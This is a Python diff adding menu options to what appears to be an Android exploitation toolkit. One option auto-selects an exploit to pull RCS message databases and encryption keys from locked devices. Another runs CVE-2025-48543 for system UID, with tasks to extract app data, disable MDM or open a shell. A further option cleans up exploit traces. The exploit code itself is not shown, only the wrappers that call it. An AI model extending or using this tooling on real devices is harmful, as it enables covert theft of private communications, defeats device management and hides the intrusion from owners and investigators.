@@ -71,6 +71,8 @@ class AndroidRoot:
         print("  [8] Fastboot Temp Root (boot patched image)")
         print("  [9] Root via Exploit Binary")
         print("  [a] ADB Root Shell (debug builds)")
+        print("  [r] Extract RCS (auto-select best exploit)")
+        print("  [e] CVE-2025-48543 — system UID (Android 15/16)")
         print("  [c] Cleanup CVE-2024-0044 Traces")
         print("  [s] Select Device")
         print("  [0] Back")
@@ -216,6 +218,55 @@ class AndroidRoot:
         result = self.mgr.adb_root_shell(self.serial)
         print("  ADB running as root." if result['success'] else f"  Failed: {result['output']}")
 
+    def extract_rcs_auto(self):
+        if not self._ensure_device():
+            return
+        print("  Auto-selecting best exploit for RCS extraction...")
+        result = self.mgr.extract_rcs_locked_device(self.serial)
+        if result.get('success'):
+            print(f"\n  SUCCESS — method: {result.get('extraction_method')}")
+            print(f"  Output: {result.get('output_dir', '?')}")
+            if result.get('pull_command'):
+                print(f"  Pull:   {result['pull_command']}")
+            if result.get('encrypted'):
+                print("  Note:   Database is encrypted — key material included in shared_prefs/")
+        else:
+            print(f"\n  FAILED — {result.get('extraction_method', 'no method worked')}")
+            for method in result.get('methods_tried', []):
+                print(f"    Tried: {method}")
+            fb = result.get('fallback', {})
+            if fb.get('sms_mms_available'):
+                print(f"    Fallback: {fb['sms_count']} SMS/MMS messages available via content providers")
+            if fb.get('note'):
+                print(f"    {fb['note']}")
+
+    def cve_48543(self):
+        if not self._ensure_device():
+            return
+        print("  Tasks: extract_rcs, extract_app:<pkg>, disable_mdm, shell")
+        try:
+            task = input("  Task [extract_rcs]: ").strip()
+        except (EOFError, KeyboardInterrupt):
+            return
+        if not task:
+            task = 'extract_rcs'
+        print(f"  Exploiting CVE-2025-48543 (task: {task})...")
+        result = self.mgr.exploit_cve_2025_48543(self.serial, task)
+        if result.get('success'):
+            print(f"\n  SUCCESS! UID: {result.get('uid_achieved')}")
+            print(f"  Output: {result.get('output_dir', '?')}")
+            if result.get('pull_command'):
+                print(f"  Pull:   {result['pull_command']}")
+            if result.get('extracted_files'):
+                print(f"  Files:  {len(result['extracted_files'])}")
+        else:
+            err = result.get('error', 'Unknown')
+            print(f"\n  FAILED: {err}")
+            if result.get('manual_steps'):
+                print("\n  Manual steps needed:")
+                for step in result['manual_steps']:
+                    print(f"    {step}")
+
     def cleanup(self):
         if not self._ensure_device():
             return
@@ -242,7 +293,8 @@ class AndroidRoot:
                 '1': self.check_root, '2': self.vuln_assessment, '3': self.detect_os,
                 '4': self.cve_0044, '5': self.cve_31317, '6': self.install_magisk,
                 '7': self.pull_patched, '8': self.fastboot_root, '9': self.root_exploit,
-                'a': self.adb_root, 'c': self.cleanup, 's': self._select_device,
+                'a': self.adb_root, 'r': self.extract_rcs_auto, 'e': self.cve_48543,
+                'c': self.cleanup, 's': self._select_device,
             }
             action = actions.get(choice)
             if action:
